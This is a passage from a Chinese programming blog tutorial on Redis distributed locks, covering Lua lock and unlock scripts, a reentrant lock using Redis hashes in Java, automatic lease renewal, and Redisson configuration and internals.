redis.call(&#x27;get&#x27;, KEYS[1]) == ARGV[1] &quot;</span> +<br>        <span class="hljs-string">&quot;then return redis.call(&#x27;del&#x27;, KEYS[1]) &quot;</span> +<br>        <span class="hljs-string">&quot;else return 0 &quot;</span> +<br>        <span class="hljs-string">&quot;end&quot;</span>;<br><span class="hljs-built_in">this</span>.redisTemplate.execute(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultRedisScript</span>&lt;&gt;(script, Boolean.class), Arrays.asList(<span class="hljs-string">&quot;lock&quot;</span>), uuid);<br></code></pre></td></tr></table></figure><h4 id="2-3-3-可重入性"><a href="#2-3-3-可重入性" class="headerlink" title="2.3.3 可重入性"></a>2.3.3 可重入性</h4><p>之前的加锁指令采用的是Redis中的 <code>setnx</code> 指令，即锁的名字固定为lock（键值固定），一旦加锁成功（键设置成功），该线程便无法继续加锁。如下即为具体情景代码：</p><p>某线程执行a方法，获取到锁之后，其又需要继续执行b方法，需要继续获取锁。但此时锁已经被自己占有，相当于自己和自己产生了死锁，这是不可重入锁带来的问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">a</span><span class="hljs-params">()</span> &#123;<br>    b();<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">b</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// pass</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解决方案：可重入锁</strong></p><p>可重入锁可：当某一线程获得锁之后，需要再次执行加锁方法时（锁对象为同一个），将加锁次数加1即可。执行完毕之后，释放锁时对加锁次数减1。当加锁次数等于0时，说明该锁已经被完全释放。</p><p>当可重入锁需要在分布式环境实现时，需要统计加锁次数。</p><p><strong>实现方案：Redis Hash + lua脚本</strong></p><p>加锁 -&gt; 判断锁是否存在：<code>exists</code></p><ul><li><p>若不存在，则直接创建锁并获取：<code>hset key field value</code></p></li><li><p>若存在，则判断当前锁是否属于自己：<code>hexists</code></p><ul><li><p>若属于，则重入：<code>hincrby key field increment</code></p></li><li><p>若不属于，递归或循环自旋重试</p></li></ul></li></ul><p><strong>加锁脚本</strong></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">if</span> redis.call(<span class="hljs-string">&#x27;exists&#x27;</span>, KEYS[<span class="hljs-number">1</span>]) == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> redis.call(<span class="hljs-string">&#x27;hexists&#x27;</span>, KEYS[<span class="hljs-number">1</span>], ARGV[<span class="hljs-number">1</span>]) == <span class="hljs-number">1</span> <br><span class="hljs-keyword">then</span><br>    redis.call(<span class="hljs-string">&#x27;hincrby&#x27;</span>, KEYS[<span class="hljs-number">1</span>], ARGV[<span class="hljs-number">1</span>], <span class="hljs-number">1</span>)<br>    redis.call(<span class="hljs-string">&#x27;expire&#x27;</span>, KEYS[<span class="hljs-number">1</span>], ARGV[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>解锁 -&gt; 判断锁是否属于自己：<code>hexists</code></p><ul><li><p>若不属于，说明正在恶意释放锁，返回 <code>nil</code></p></li><li><p>若属于，对加锁次数减1，并判断当前加锁次数是否为0</p><ul><li><p>若为0，则返回1，代表完全解锁成功</p></li><li><p>若不为0，则返回0</p></li></ul></li></ul><p><strong>解锁脚本</strong></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">if</span> redis.call(<span class="hljs-string">&#x27;hexists&#x27;</span>, KEYS[<span class="hljs-number">1</span>], ARGV[<span class="hljs-number">1</span>]) == <span class="hljs-number">0</span><br><span class="hljs-keyword">then</span> <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br><span class="hljs-keyword">elseif</span> redis.call(<span class="hljs-string">&#x27;hincrby&#x27;</span>, KEYS[<span class="hljs-number">1</span>], ARGV[<span class="hljs-number">1</span>], <span class="hljs-number">-1</span>) == <span class="hljs-number">0</span><br><span class="hljs-keyword">then</span> <br>    <span class="hljs-keyword">return</span> redis.call(<span class="hljs-string">&#x27;del&#x27;</span>, KEYS[<span class="hljs-number">1</span>])<br><span class="hljs-keyword">else</span> <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p><strong>代码实现</strong></p><ol><li><p>创建分布式锁的工厂类方法。通过一个工厂类方法，可以获得不同的分布式锁（基于Redis、基于Zookeeper、基于MySQL）</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DistributedLockClient</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> StringRedisTemplate redisTemplate;<br><br>    <span class="hljs-keyword">private</span> String uuid;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DistributedLockClient</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.uuid = UUID.randomUUID().toString();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> DistributedRedisLock <span class="hljs-title function_">getRedisLock</span><span class="hljs-params">(String lockName)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DistributedRedisLock</span>(redisTemplate, lockName, uuid);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>创建分布式Redis锁的实现类，其实现了Lock接口。通过之前编写好的加锁、解锁脚本，实现了可重入锁。</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DistributedRedisLock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Lock</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> StringRedisTemplate redisTemplate;<br><br>    <span class="hljs-keyword">public</span> String lockName;<br><br>    <span class="hljs-keyword">private</span> String uuid;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-variable">expire</span> <span class="hljs-operator">=</span> <span class="hljs-number">30</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DistributedRedisLock</span><span class="hljs-params">(StringRedisTemplate redisTemplate, String lockName, String uuid)</span> &#123;<br>        <span class="hljs-built_in">this</span>.redisTemplate = redisTemplate;<br>        <span class="hljs-built_in">this</span>.lockName = lockName;<br>        <span class="hljs-built_in">this</span>.uuid = uuid;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.tryLock();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lockInterruptibly</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.tryLock(-<span class="hljs-number">1L</span>, TimeUnit.SECONDS);<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(<span class="hljs-type">long</span> time, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        <span class="hljs-built_in">this</span>.expire = time != -<span class="hljs-number">1</span> ? unit.toSeconds(time) : expire;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">script</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;if redis.call(&#x27;exists&#x27;, KEYS[1]) == 0 or redis.call(&#x27;hexists&#x27;, KEYS[1], ARGV[1]) == 1 \n&quot;</span> +<br>                        <span class="hljs-string">&quot;then\n&quot;</span> +<br>                        <span class="hljs-string">&quot;    redis.call(&#x27;hincrby&#x27;, KEYS[1], ARGV[1], 1)\n&quot;</span> +<br>                        <span class="hljs-string">&quot;    redis.call(&#x27;expire&#x27;, KEYS[1], ARGV[2])\n&quot;</span> +<br>                        <span class="hljs-string">&quot;    return 1\n&quot;</span> +<br>                        <span class="hljs-string">&quot;else\n&quot;</span> +<br>                        <span class="hljs-string">&quot;    return 0\n&quot;</span> +<br>                        <span class="hljs-string">&quot;end&quot;</span>;<br>        <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">this</span>.redisTemplate.execute(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultRedisScript</span>&lt;&gt;(script, Boolean.class), Arrays.asList(lockName), getId(), String.valueOf(expire))) &#123;<br>            Thread.sleep(<span class="hljs-number">50</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">script</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;if redis.call(&#x27;hexists&#x27;, KEYS[1], ARGV[1]) == 0\n&quot;</span> +<br>                        <span class="hljs-string">&quot;then \n&quot;</span> +<br>                        <span class="hljs-string">&quot;    return nil\n&quot;</span> +<br>                        <span class="hljs-string">&quot;elseif redis.call(&#x27;hincrby&#x27;, KEYS[1], ARGV[1], -1) == 0\n&quot;</span> +<br>                        <span class="hljs-string">&quot;then \n&quot;</span> +<br>                        <span class="hljs-string">&quot;    return redis.call(&#x27;del&#x27;, KEYS[1])\n&quot;</span> +<br>                        <span class="hljs-string">&quot;else \n&quot;</span> +<br>                        <span class="hljs-string">&quot;    return 0\n&quot;</span> +<br>                        <span class="hljs-string">&quot;end&quot;</span>;<br>        <span class="hljs-type">Long</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.redisTemplate.execute(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultRedisScript</span>&lt;&gt;(script, Long.class), Arrays.asList(lockName), getId());<br>        <span class="hljs-keyword">if</span> (flag == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>(<span class="hljs-string">&quot;this lock does not belong to you&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Condition <span class="hljs-title function_">newCondition</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    String <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> uuid + <span class="hljs-string">&quot;:&quot;</span> + Thread.currentThread().getId();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>修改StockService中的deduct方法</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deduct</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">DistributedRedisLock</span> <span class="hljs-variable">redisLock</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.distributedLockClient.getRedisLock(<span class="hljs-string">&quot;lock&quot;</span>);<br>    redisLock.lock();<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 查询库存信息</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">stock</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(<span class="hljs-string">&quot;stock&quot;</span>).toString();<br>        <span class="hljs-comment">// 判断库存是否充足</span><br>        <span class="hljs-keyword">if</span> (stock != <span class="hljs-literal">null</span> &amp;&amp; stock.length() != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">Integer</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> Integer.valueOf(stock);<br>            <span class="hljs-keyword">if</span> (st &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">// 扣减库存</span><br>                redisTemplate.opsForValue().set(<span class="hljs-string">&quot;stock&quot;</span>, String.valueOf(--st));<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">this</span>.test();<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        redisLock.unlock();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>需要注意的一点是：如何去标识每一个服务中的每一个线程的锁的uuid？</p><p>这里的解决方案是：通过服务生成的uuid与每个线程的线程id拼接得到唯一标识uuid</p><ol><li><p>每一个服务是通过DistributedLockClient这一工厂类获得锁，由于该类交给Spring容器管理，是单例对象。即每一个服务只有一个唯一的DistributedLockClient对象。</p><p> 因此可以在该类构造方法上生成一个uuid，作为当前服务的唯一标识</p></li><li><p>每一个线程也会有一个唯一的id</p></li><li><p>将两者拼接起来（getId方法），即可唯一标识每一个服务的每一个线程。若需要进行重入操作，同一线程重复获取锁，可通过此唯一标识进行判断。</p></li></ol><p>反之，如果每次通过DistributedLockClient获取Redis分布式锁，均重新创建一个新的uuid，那么便永远无法实现可重入锁。</p><ul><li>因为在同一线程进行可重入操作获取锁时，会出现内层锁与外层锁uuid不匹配的错误情况，与理论事实相矛盾。</li></ul><h4 id="2-3-4-自动续期"><a href="#2-3-4-自动续期" class="headerlink" title="2.3.4 自动续期"></a>2.3.4 自动续期</h4><p>假设处理请求的时长大于锁的有效时间，会出现请求还未处理完，锁就被释放了，此时可能引起并发问题。</p><p><strong>解决方案：</strong></p><ul><li><p>采用Timer定时任务，每隔一段时间为锁续期</p></li><li><p>配合lua脚本执行最后的续期操作</p><p>  先判断锁是否存在。若存在则重置过期时间</p>  <figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">if</span>(redis.call(<span class="hljs-string">&#x27;hexists&#x27;</span>, KEYS[<span class="hljs-number">1</span>], ARGV[<span class="hljs-number">1</span>]) == <span class="hljs-number">1</span>) <br><span class="hljs-keyword">then</span> <br>    redis.call(<span class="hljs-string">&#x27;expire&#x27;</span>, KEYS[<span class="hljs-number">1</span>], ARGV[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">else</span> <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure></li></ul><p><strong>代码实现</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">renewExpire</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">script</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;if(redis.call(&#x27;hexists&#x27;, KEYS[1], ARGV[1]) == 1) \n&quot;</span> +<br>                    <span class="hljs-string">&quot;then \n&quot;</span> +<br>                    <span class="hljs-string">&quot;    redis.call(&#x27;expire&#x27;, KEYS[1], ARGV[2])\n&quot;</span> +<br>                    <span class="hljs-string">&quot;    return 1\n&quot;</span> +<br>                    <span class="hljs-string">&quot;else \n&quot;</span> +<br>                    <span class="hljs-string">&quot;    return 0\n&quot;</span> +<br>                    <span class="hljs-string">&quot;end&quot;</span>;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Timer</span>().schedule(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TimerTask</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">if</span> (redisTemplate.execute(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultRedisScript</span>&lt;&gt;(script, Boolean.class), Arrays.asList(lockName), uuid, String.valueOf(expire))) &#123;<br>                renewExpire();<br>            &#125;<br>        &#125;<br>    &#125;, <span class="hljs-built_in">this</span>.expire * <span class="hljs-number">1000</span> / <span class="hljs-number">3</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>其中需要注意的点是：</p><ul><li><p>之前是通过 <code>getId()</code> 方法，将当前服务的uuid与当前线程的id拼接到一起，组成唯一标识。</p><p>  而现在的问题为：Timer定时任务是子线程，它的本意是监测主线程的锁的过期时间并为其续期，但是在其内部调用getId方法，得到的锁唯一标识是拼接的Timer定时任务子线程的id。</p></li><li><p>因此，需要对代码进行进一步修改与优化，删去getId方法，修改DistributedRedisLock的构造方法，在创建该类时便生成唯一的uuid。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">DistributedRedisLock</span><span class="hljs-params">(StringRedisTemplate redisTemplate, String lockName, String uuid)</span> &#123;<br>    <span class="hljs-built_in">this</span>.redisTemplate = redisTemplate;<br>    <span class="hljs-built_in">this</span>.lockName = lockName;<br>    <span class="hljs-built_in">this</span>.uuid = uuid + <span class="hljs-string">&quot;:&quot;</span> + Thread.currentThread().getId();<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="2-4-RedLock红锁算法"><a href="#2-4-RedLock红锁算法" class="headerlink" title="2.4 RedLock红锁算法"></a>2.4 RedLock红锁算法</h3><p>我结合老师的讲解，单独写了一篇<a href="">图文详解RedLock（结合官方文档）</a></p><p>其中一些内容参照了官方文档以及其他大佬的博客</p><p>这一部分均为理论内容，没有实际代码</p><h3 id="2-5-Redisson"><a href="#2-5-Redisson" class="headerlink" title="2.5 Redisson"></a>2.5 Redisson</h3><h4 id="2-5-1-环境搭建"><a href="#2-5-1-环境搭建" class="headerlink" title="2.5.1 环境搭建"></a>2.5.1 环境搭建</h4><p>参考 <a href="https://github.com/redisson/redisson/wiki">Redisson文档</a></p><ol><li><p>引入依赖</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.redisson<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>redisson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.17.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>由于Redisson不能使用yml进行配置，因此需要编写额外的配置类</p><p> 新建 <code>config</code> 包，创建 <code>RedissonConfig</code> 类</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedissonConfig</span> &#123;<br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> RedissonClient <span class="hljs-title function_">redissonClient</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Config</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Config</span>();<br>        config.useSingleServer().setAddress(<span class="hljs-string">&quot;redis://127.0.0.1:6379&quot;</span>).setPassword(<span class="hljs-string">&quot;123456&quot;</span>).setDatabase(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> Redisson.create(config);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>修改 <code>StockService</code> 中的 <code>deduct</code> 方法</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Autowired</span>  <br><span class="hljs-keyword">private</span> RedissonClient redissonClient;  <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deduct</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-type">RLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.redissonClient.getLock(<span class="hljs-string">&quot;lock&quot;</span>);  <br>    lock.lock();  <br>    <span class="hljs-comment">// 查询库存信息  </span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">stock</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(<span class="hljs-string">&quot;stock&quot;</span>).toString();  <br>    <span class="hljs-comment">// 判断库存是否充足  </span><br>    <span class="hljs-keyword">try</span> &#123;  <br>        <span class="hljs-keyword">if</span> (stock != <span class="hljs-literal">null</span> &amp;&amp; stock.length() != <span class="hljs-number">0</span>) &#123;  <br>            <span class="hljs-type">Integer</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> Integer.valueOf(stock);  <br>            <span class="hljs-keyword">if</span> (st &gt; <span class="hljs-number">0</span>) &#123;  <br>                <span class="hljs-comment">// 扣减库存  </span><br>                redisTemplate.opsForValue().set(<span class="hljs-string">&quot;stock&quot;</span>, String.valueOf(--st));  <br>            &#125;  <br>        &#125;  <br>    &#125; <span class="hljs-keyword">finally</span> &#123;  <br>        lock.unlock();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p> 也可以设置lock的过期时间，到时间时自动释放锁</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">lock.lock(<span class="hljs-number">10</span>, TimeUnit.SECONDS);<br></code></pre></td></tr></table></figure></li></ol><p>常用的Redisson配置</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/iShot2022-10-12%2017.07.13.png"></p><h4 id="2-5-2-可重入锁"><a href="#2-5-2-可重入锁" class="headerlink" title="2.5.2 可重入锁"></a>2.5.2 可重入锁</h4><h5 id="底层原理"><a href="#底层原理" class="headerlink" title="底层原理"></a>底层原理</h5><p>RLock接口的lock方法是通过继承JUC包下的Lock接口获得，最终RedissonLock间接实现了RLock接口以及其中的中法。</p><p>继承关系如图所示：</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/rlock.png"></p><p>RedissonLock中具体lock方法实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-keyword">try</span> &#123;  <br>        lock(-<span class="hljs-number">1</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">false</span>);  <br>    &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;  <br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>根据顺序，一步步进入方法查看：</p><p>lock -&gt; tryAcquire -&gt; tryAcquireAsync -&gt; tryLockInnerAsync</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;T&gt; RFuture&lt;T&gt; <span class="hljs-title function_">tryLockInnerAsync</span><span class="hljs-params">(<span class="hljs-type">long</span> waitTime, <span class="hljs-type">long</span> leaseTime, TimeUnit unit, <span class="hljs-type">long</span> threadId, 